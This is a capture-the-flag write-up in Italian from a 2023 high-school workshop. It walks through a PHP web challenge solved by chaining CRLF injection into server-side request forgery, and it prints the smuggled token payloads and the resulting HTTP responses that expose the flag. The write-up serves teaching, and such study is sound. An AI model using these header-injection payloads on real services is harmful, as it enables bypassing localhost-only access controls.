# 4th HighSchools CTF Workshop - Perugia 2023

## [web] The Backend

Il sito è scritto in PHP e al suo interno sono presenti 3 pagine: `index.php`, `token.php` e `flag.php`.

La pagina `index.php` contiene un form che permette di inserire un token e inviarlo al backend.

La pagina `token.php` contiene il codice che viene eseguito dal backend e che si occupa di validare il token.

La pagina `flag.php` contiene la flag che viene visualizzata soltanto se la richiesta proviene dal backend stesso.

## Vulnerabilità

### Carriage Return Line Feed Injection (CRLF Injection)

La CRLF injection è una vulnerabilità che permette di iniettare dei caratteri di ritorno a capo (`\r\n`) all'interno di una richiesta HTTP.  
Lo scopo di questa vulnerabilità è quello di injectare header HTTP aggiuntivi (ad esempio `X-Forwarded-For` per simulare un IP proxato differente oppure `Host` per visualizzare un vhost differente).  
Nelle richieste HTTP/1.1 e HTTP/2 è possibile utilizzare la CRLF injection per far eseguire più richieste HTTP in una singola connessione.

### Server Side Request Forgery (SSRF)

Spesso alcuni backend per poter funzionare devono effettuare delle richieste HTTP ad altri backend.  
L'SSRF è una vulnerabilità che consiste nel manipolare le chiamate effettuate verso altri backend per eseguire richieste arbitrarie o differenti da quelle previste.  
Molti backend permettono le chiamate soltanto a determinati indirizzi IP sorgenti (es 127.0.0.1) e non hanno altri sistemi di autenticazione.  
Mediante SSRF si fanno eseguire richieste a backend autorizzati e utilizzando il loro IP sorgente (o eventuali sistemi di autenticazione automaticamente caricati ad ogni richiesta) è possibile aggirate i controlli di autenticazione.

## Soluzione

L'interfaccia grafica come da descrizione permette all'utente di inserire un token.  
Il token viene inviato ad altri backend che lo validano e restituiscono un risultato.  
Il punto è che la richiesta agli altri backend viene fatta senza librerie esterna, ma utilizzando direttamente i socket a basso livello.

Inviando come token un qualcosa tipo `testtoken` possiamo immaginare venga effettuata una richiesta di questo tipo (i `\r\n` sono stati aggiunti per leggibilità):

<pre>
GET /token.php HTTP/1.1<i>\r\n</i>
Host: localhost<i>\r\n</i>
X-API-Token: <span style="color: red">testtoken</span><i>\r\n</i>
Connection: close<i>\r\n\r\n</i>

</pre>

Le librerie esterne avrebbero gestito la formattazione degli header (in particolare "X-API-Token") garantendo che non ci siano problemi di injection.  
Usando però i socket a basso livello, in mancanza di controlli o sanitizzazione, possiamo fare injection di header inserendo dei `\r\n` (ritorni a capo) all'interno del token (questa vulnerabilità è nota come `CRLF` injection).  
Inviando un token del tipo `testtoken\r\nX-Test: 1234567890` possiamo immaginare venga effettuata una richiesta di questo tipo:

<pre>
GET /token.php HTTP/1.1<i>\r\n</i>
Host: localhost<i>\r\n</i>
X-API-Token: <span style="color: red">testtoken<i>\r\n</i>
X-Test: 1234567890</span><i>\r\n</i>
Connection: close<i>\r\n\r\n</i>

</pre>

Visitando manualmente la pagina `/flag.php` notiamo che la richiesta viene rifiutata in quanto non effettuata da localhost.  
Dobbiamo dunque sfruttare una vulnerabilità di SSRF (Server Side Request Forgery) per far eseguire una chiamata a `/flag.php` dal server stesso.

Per farlo possiamo sfruttare la CRLF injection per far eseguire al server due chiamate in sequenza anziché una sola.  
Inviando dunque un token del tipo `testtoken\r\n\r\nGET /flag.php HTTP/1.0`, graficamente:

```
testtoken

GET /flag.php HTTP/1.0
```

Possiamo immaginare venga effettuata una chiamata di questo tipo:

<pre>
GET /token.php HTTP/1.1<i>\r\n</i>
Host: localhost<i>\r\n</i>
X-API-Token: <span style="color: red">testtoken<i>\r\n\r\n</i>

GET /flag.php HTTP/1.0</span><i>\r\n</i>
Connection: close<i>\r\n\r\n</i>

</pre>

Andando così ad eseguire due richieste HTTP in una singola connessione possiamo eseguire chiamate arbitrarie dal server stesso, la cui risposta sarà:

<pre>
<span style="color: green">HTTP/1.1 200 OK
Date: Sat, 18 Nov 2023 13:31:53 GMT
Server: Apache/2.4.58 (Unix) PHP/8.2.12
X-Powered-By: PHP/8.2.12
Content-Length: 36
Content-Type: text/html; charset=UTF-8

Hello user, your token is: testtoken</span><span style="color: red">HTTP/1.1 200 OK
Date: Sat, 18 Nov 2023 13:31:53 GMT
Server: Apache/2.4.58 (Unix) PHP/8.2.12
X-Powered-By: PHP/8.2.12
Content-Length: 42
Connection: close
Content-Type: text/html; charset=UTF-8

flag{SSRF_this_CRLF_that_vulns_everywhere}</span>
</pre>

**Nota1**: passando come token soltanto `testtoken\r\n\r\nGET /flag.php` (senza la versione HTTP o altri header) la richiesta viene eseguita seguendo gli standard `HTTP 0.9`, pertanto la seconda risposta non conterrà gli header e sarà concatenata direttamente alla precedente:

<pre>
<span style="color: green">HTTP/1.1 200 OK
Date: Sat, 18 Nov 2023 13:31:53 GMT
Server: Apache/2.4.58 (Unix) PHP/8.2.12
X-Powered-By: PHP/8.2.12
Content-Length: 36
Content-Type: text/html; charset=UTF-8

Hello user, your token is: testtoken</span><span style="color: red">flag{SSRF_this_CRLF_that_vulns_everywhere}</span>
</pre>

**Nota2**: il server esegue la chiamata utilizzando `HTTP/1.1` il quale prevede la possibilità di mantenere la connessione aperta per più richieste. Se avesse utilizzato `HTTP/1.0` la connessione sarebbe stata chiusa dopo la prima richiesta e la seconda non sarebbe stata eseguita. Un raro caso di "security by obsolescence", ma valido soltanto per l'SSRF, non per la CRLF injection.
